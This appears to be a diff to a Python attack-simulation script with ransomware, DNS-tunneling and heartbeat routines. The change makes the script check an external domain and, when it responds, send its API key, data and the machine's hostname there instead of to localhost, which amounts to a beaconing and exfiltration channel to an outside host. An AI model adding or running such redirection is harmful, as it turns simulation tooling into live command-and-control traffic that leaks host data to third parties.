@@ -33,14 +33,35 @@ file_count = 200
 file_prefix = "test_file_"
 file_extension = ".txt"
 
+
+
+
 ##########################
 #### Helper Functions ####
 ##########################
 
+# Helper function to allow both external and localhost calls
+def get_base_url():
+    external_url = "https://bitlus.online"
+    local_url = "http://127.0.0.1"
+    try:
+        # Try reaching the external domain
+        response = requests.head(external_url, timeout=2) 
+        if response.status_code == 200:
+            print(f"External domain '{external_url}' is reachable.")
+            return external_url
+    except requests.RequestException:
+        print(f"External domain '{external_url}' is not reachable. Falling back to localhost.")
+    # Fallback to localhost
+    print(local_url)
+    return local_url
+
+base_url = get_base_url()
+
 def data_to_send(data):
     try:
         response = requests.post(
-            "http://127.0.0.1:5000/api/datatosend",
+            f"{base_url}:5000/api/datatosend",
             json={"api_key": API_KEY, "data": data},
         )
         if response.status_code == 200:
@@ -373,7 +394,7 @@ def ransomware_simulation():
 
 def dns_tunneling():
     logging_func("DNS tunneling simulation starting")
-    DNS_TUNNEL_API = "http://127.0.0.1:5000/api/dnstunneling"
+    DNS_TUNNEL_API = f"{base_url}:5000/api/dnstunneling"
     try:
         print("Executing DNS Tunneling Use-Case")
 
@@ -543,7 +564,7 @@ def heart_beat():
         print(hostname)
         while True:
             response = requests.post(
-                "http://127.0.0.1:5000/api/heartbeat",
+                f"{base_url}:5000/api/heartbeat",
                 json={"host_name": hostname, "api_key":API_KEY},
             )
             print(response.raw)
